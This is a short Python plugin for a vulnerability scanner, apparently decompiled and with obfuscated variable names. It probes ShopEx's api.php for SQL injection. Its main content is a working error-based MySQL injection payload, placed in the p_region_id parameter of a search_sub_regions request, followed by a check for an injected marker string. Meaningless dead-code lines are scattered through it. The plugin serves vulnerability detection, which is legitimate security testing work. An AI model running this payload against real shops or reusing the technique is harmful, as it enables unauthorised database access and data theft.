#Embedded file name: shopex_api_inj.py
import urllib
if 0:
    i11iIiiIii

def assign(service, arg):
    if service == 'shopex':
        return (True, arg)
        if 0:
            O0 / iIii1I11I1II1 % OoooooooOO - i1IIi


def audit(arg):
    o0OO00 = {'act': 'search_sub_regions',
     'api_version': '1.0',
     'return_data': 'string',
     'p_region_id': '22 and (select 1 from(select count(*),concat(0x7c,(select 0x40776562736166657363616E40 from information_schema.tables limit 0,1),0x7c,floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a)#'}
    oo = arg
    i1iII1IiiIiI1, iIiiiI1IiI1I1, o0OoOoOO00, I11i, O0O = curl.curl('-d "%s" %s/api.php' % (urllib.urlencode(o0OO00), oo))
    if o0OoOoOO00 and o0OoOoOO00.find('@websafescan@') != -1:
        security_hole(oo)
        if 0:
            i11ii11iIi11i.oOoO0oo0OOOo + IiiI / Iii1ii1II11i


if __name__ == '__main__':
    from dummy import *
